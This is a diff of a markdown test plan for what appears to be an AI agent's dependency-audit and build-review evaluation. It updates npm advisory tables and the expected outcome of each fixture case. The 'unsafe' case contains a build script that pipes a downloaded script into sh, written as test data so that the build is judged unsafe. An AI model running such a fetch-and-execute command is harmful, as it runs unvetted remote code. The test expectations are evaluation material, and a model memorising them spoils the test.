@@ -101,6 +101,8 @@ them), to confirm no deterministic check aborts a case that should reach row 14.
 | lodash@4.17.20 | GHSA-35jh-r3h4-6jhm (CVE-2021-23337), also GHSA-r5fr-rjxr-66jc | high | 4.17.21, 4.18.0 |
 | dompurify@3.1.2 | GHSA-mmhx-hmjr-r674 (CVE-2024-45801), GHSA-gx9m-whjm-85jf (CVE-2024-47875), each affecting `>=3.0.0 <3.1.3` | high | 3.1.3 |
 | dompurify@3.1.3 | moderate and low advisories only | moderate | 3.2.4 and later |
+| dompurify@3.4.3 | GHSA-mrv2-3pqr-j5jr, affecting every release below 3.4.17 (confirmed 2026-11-06) | high | 3.4.17 |
+| dompurify@3.4.17 | none (confirmed 2026-11-06) | | |
 | ms@1.0.0 | GHSA-w9mr-4mfr-499f (CVE-2017-20162), its only advisory | moderate | 2.0.0 |
 | husky@9.1.7 | none | | |
 
@@ -120,11 +122,11 @@ safety concern, and the case would end as judged unsafe instead of failed.
 | clean-fails | A | `turndown` removed | 0 high, 0 critical | row 14: the agent's build failed, `SCA_RESCUED` absent |
 | reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
 | reduce-fails | A | as reduce-builds, and `turndown` removed | 1 high | abort: known vulnerabilities, rescue failed, rescued copy 0 high |
-| fix-builds | A | `"dompurify": ">=3.1.2 <=3.1.3"`, locked at 3.1.2 | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
+| fix-builds | A | `"dompurify": ">=3.4.3 <=3.4.17"`, locked at 3.4.3 | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
 | fix-fails | A | as fix-builds, and `turndown` removed | 1 high | abort: known vulnerabilities, rescue failed, rescued copy 0 high |
 | fix-impossible | A | `"dompurify": ">=3.0.0 <=3.1.2"`, locked at 3.1.2 | 1 high | abort: known vulnerabilities, rescue failed, rescued copy high > 0 |
 | husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
-| moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, `1 moderate, 0 high, 0 critical` |
+| moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, at least 1 moderate, 0 high, 0 critical |
 | unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | not read | downgrade: build process issues (`build-unsafe`), not built |
 | not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | downgrade: build process issues (`sca-lock-file-multiple`) |
 | pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown (the pnpm commands) |
@@ -136,11 +138,16 @@ Each case, and why it lands where it does:
   clears the lock. Confirmed in a scratch copy: with lodash removed and the lock refreshed
   (npm, and pnpm for pnpm-reduce), the audit reads 0 high, 0 critical.
 - **pnpm-reduce** is set up as a current pnpm project must be: it pins its pnpm release and
-  approves its dependencies' install scripts.
+  approves its dependencies' install scripts. Its lock was refreshed on 2026-11-06 to hold
+  dompurify 3.4.17, as the npm cases' locks do: 3.4.16, which it held before, carries a high
+  and a critical advisory since 2026-10-22.
 - **fix-builds, fix-fails:** dompurify is imported by the source, so it stays. Its range is
-  capped at 3.1.3, the release that fixes both high advisories, so no later release can be
-  picked. Confirmed in a scratch copy: `npm audit fix --package-lock-only --ignore-scripts`
-  moves it to 3.1.3, and the audit then reads 1 moderate, 0 high, 0 critical.
+  capped at 3.4.17, the release that fixes the high advisory, so no later release can be
+  picked. The floor is 3.4.3, the base's own: every release from 3.4.4 to 3.4.16 also carries
+  a critical one (GHSA-cg2g-xh64-v4q7). Confirmed in a scratch copy on 2026-11-06: `npm audit
+  fix --package-lock-only --ignore-scripts` moves it to 3.4.17, and the audit then reads 0
+  moderate, 0 high, 0 critical. Until then the range was `>=3.1.2 <=3.1.3`, which the high
+  advisory of 2026-10-22 made unfixable.
 - **fix-impossible:** every release in `>=3.0.0 <=3.1.2` is affected by both high advisories,
   and the lock already holds the highest. Confirmed: the audit fix leaves 3.1.2 in place. The
   source imports dompurify, so removing it fails the build as well, and the rescue fails
@@ -152,8 +159,10 @@ Each case, and why it lands where it does:
   husky present, `prepare` passes: husky 9.1.7 prints that `.git` cannot be found and exits 0
   outside a git repository (read from its bin.js, not run).
 - **moderate-only:** ms@1.0.0 is unused and its only advisory is moderate, so the lock is
-  clean and the original is built without a rescue. dompurify's frequent new advisories are
-  the likely drift here: one on the regenerated release would make the count 2.
+  clean and the original is built without a rescue. The case counts at least 1 moderate, since
+  a new moderate advisory on another package of the lock is likely (vite 6.4.4 got one,
+  GHSA-8g5g-mxqh-grgj, in 2026-11), and what the case is about is that nothing is high or
+  critical.
 - **unsafe:** the build script pipes a downloaded script into `sh`. The URL is never fetched:
   the agent judges the build unsafe, and the switch answers the reviewer's build decision by
   trusting that verdict, so nothing runs. The review reports `build-unsafe` and, the XPI being
